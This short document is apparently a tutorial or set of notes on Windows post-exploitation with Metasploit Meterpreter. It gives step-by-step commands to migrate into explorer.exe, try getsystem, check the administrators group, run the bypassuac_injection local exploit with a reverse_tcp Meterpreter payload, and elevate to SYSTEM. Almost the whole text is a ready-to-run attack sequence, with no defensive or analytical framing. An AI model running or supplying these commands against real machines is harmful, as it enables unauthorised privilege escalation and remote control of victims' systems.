This will take place after gaining initial access. You need to have an admin account. 
Migrate the process in
explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate
the current process to that explorer process.
-ps -S explorer.exe
-migrate 2440

We can try the getsystem command to elevate to System rights, but if it doesnt work we will have to try something else
-getsystem

Next, we will get a windows shell and check if the admin user is a member of the Administrators
group.7
-shell
-net localgroup administrators

We are going to bypass UAC using the Metasploit local exploit module
-use exploit/windows/local/bypassuac_injection
-set session 1
-set TARGET 1
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-exploit

After gaining access, we can use the getsystem command to elevate to system privileges
-getsystem
